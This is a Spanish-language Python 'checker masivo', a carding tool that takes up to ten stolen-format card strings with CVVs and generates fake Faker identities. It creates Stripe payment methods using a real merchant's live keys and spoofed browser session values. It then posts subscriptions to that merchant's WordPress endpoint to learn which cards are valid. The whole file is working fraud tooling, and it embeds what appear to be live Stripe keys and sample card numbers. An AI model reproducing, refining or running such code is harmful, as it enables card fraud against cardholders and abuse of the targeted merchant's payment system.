import re
import sys
import requests
import urllib3
import random
import faker

Faker = faker.Faker()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

nombre = Faker.first_name()
lastname = Faker.last_name()
address = Faker.street_address()
city = Faker.city()
state = Faker.state()
postalcode = Faker.postcode()
email = Faker.email()
password = random.choice(["12345678", "password", "qwerty123", "letmein", "abc12345"])
repassword = password




def check_card(cc, proxy=None, verify=False):
    """Check a single card string (formats like 'num|mm|yyyy|cvv' or variants).
    Returns a dict with keys: ok (bool), payment_method (dict), subscribe_resp (requests.Response or None), mb_copy (str or None), error (str or None)
    This function is safe to call from other modules.
    """
    result = {"ok": False, "payment_method": None, "subscribe_resp": None, "mb_copy": None, "error": None}
    session = requests.Session()
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})

    # BIN metadata (best-effort)
    try:
        bin_prefix = re.sub(r"\D", "", cc)[:6]
        if bin_prefix:
            try:
                token_resp = session.get(
                    f"https://api.stripe.com/edge-internal/card-metadata?bin_prefix={bin_prefix}&key=pk_live_51OyjHsRtMZ7xXIEtWww8NoJVG08j0mVKroS08szl4hzufIPw0B8QJRNWfCMJc8XA2yMW5Gw1fJNgyqE7NZMpJugY00eb7BMTew",
                    headers={"Authorization": "Bearer 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"},
                    verify=verify,
                    timeout=15,
                )
                # don't require the token; ignore errors
                _ = token_resp.json()
            except Exception:
                pass
    except Exception:
        pass

    # parse card
    tokens = re.split(r"[\s|,;]+", cc)
    number = month = year = cvc = None
    for t in tokens:
        digits = re.sub(r"\D", "", t)
        if not digits:
            continue
        if 13 <= len(digits) <= 19 and number is None:
            number = digits
            continue
        if len(digits) == 2 and month is None:
            month = digits
            continue
        if len(digits) in (2, 4) and year is None:
            year = digits
            continue
        if len(digits) in (3, 4) and cvc is None:
            cvc = digits

    if not all([number, month, year, cvc]):
        result["error"] = "No se pudo parsear la tarjeta"
        return result
    if len(year) == 2:
        year = "20" + year

    # create payment method
    pm_headers = {"User-Agent": "Stripe/v1 PythonBindings"}
    pm_data = {
        "type": "card",
        "billing_details[name]": f"{nombre} {lastname}",
        "billing_details[email]": email,
        "billing_details[address][line1]": address,
        "billing_details[address][line2]": "3433",
        "billing_details[address][city]": city,
        "billing_details[address][state]": state,
        "billing_details[address][postal_code]": postalcode,
        "billing_details[address][country]": "US",
        "card[number]": number,
        "card[cvc]": cvc,
        "card[exp_month]": month,
        "card[exp_year]": year,
        "guid": "fc6857a8-8ae6-4e19-bd4c-835ed3646daa26be8c",
        "muid": "dbf88cea-1c65-419a-82b5-b8eceee8b0b47a05ad",
        "sid": "5efb9a7b-113b-4bea-9463-489396857554bc5734",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/58d9408f11; stripe-js-v3/58d9408f11; card-element",
        "referrer": "https://pencilboxsolutions.org",
        "time_on_page": "103264",
        "client_attribution_metadata[client_session_id]": "6c39034b-ccf3-4f03-ab80-d196f36ad18d",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "client_attribution_metadata[wallet_config_id]": "f2b2dcf8-3111-4cbd-b4d2-9fd15d95aba8",
        "key": "pk_live_51OyjHsRtMZ7xXIEtWww8NoJVG08j0mVKroS08szl4hzufIPw0B8QJRNWfCMJc8XA2yMW5Gw1fJNgyqE7NZMpJugY00eb7BMTew",
    }
    try:
        pm_resp = session.post("https://api.stripe.com/v1/payment_methods", headers=pm_headers, data=pm_data, verify=verify, timeout=30)
        trans = pm_resp.json()
        result["payment_method"] = trans
    except Exception as e:
        result["error"] = f"Error creando payment_method: {e}"
        return result

    payment_method_id = trans.get("id")
    if not payment_method_id:
        result["error"] = "No se obtuvo paymentMethod id"
        return result

    # subscribe
    try:
        suscribe = session.post(
            "https://pencilboxsolutions.org/wp-content/themes/pencilbox2024/subscribe-user.php",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8",
                "Cache-Control": "no-cache",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://pencilboxsolutions.org",
                "Pragma": "no-cache",
                "Referer": "https://pencilboxsolutions.org/subscribe/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            },
            data={
                "paymentMethodId": payment_method_id,
                "subscription-type": "single-monthly",
                "promo-code": "",
                "fname": nombre,
                "lname": lastname,
                "email": email,
                "pass1": password,
                "pass2": repassword,
                "addy1": address,
                "addy2": "3433",
                "city": city,
                "state": state,
                "zip": postalcode,
                "policy-agree": "on"
            },
            verify=verify,
            timeout=30,
        )
        result["subscribe_resp"] = suscribe
        match = re.search(r'<div id="mb-copy">(.*?)</div>', suscribe.text, re.S)
        if match:
            result["mb_copy"] = match.group(1).strip()
        result["ok"] = True
    except Exception as e:
        result["error"] = f"Error en subscribe: {e}"

    return result


# (CLI entry moved to checkmassive)


def checkmassive():
    print("\n=== CHECKER MASIVO (máximo 10 tarjetas) ===")
    print("Ingresa tarjetas (separadas por saltos de línea, comas o pipes).")
    print("Formatos: '5236800114489576|02|29|658' o '5236 8001 1448 9576 02/29 658'")
    print("Ejemplo:\n  5236800114489576 02 29 658\n  5236 8001 1448 9576 02/29 658\n  4318292900928294,05,26,712\n")
    
    raw_input = input("Pega todas las tarjetas (máx 10): ").strip()
    if not raw_input:
        print("No ingresaste tarjetas. Saliendo.")
        return
    
    # Separar por saltos de línea primero
    ccs = [line.strip() for line in raw_input.split('\n') if line.strip()]
    
    if len(ccs) > 10:
        ccs = ccs[:10]
        print(f"\n⚠️  Solo procesaré las primeras 10 tarjetas.\n")
    
    print(f"✓ Se procesarán {len(ccs)} tarjeta(s).\n")
    
    for idx, cc in enumerate(ccs, 1):
        print(f"\n{'='*60}")
        print(f"Procesando tarjeta {idx}/{len(ccs)}")
        print(f"{'='*60}")
        try:
            res = check_card(cc.strip())
            print(res)
        except Exception as e:
            print(f"Error al procesar tarjeta {idx}: {e}")
            continue
    
    print(f"\n✓ Completado. Se procesaron {len(ccs)} tarjeta(s).")


if __name__ == "__main__":
    checkmassive()

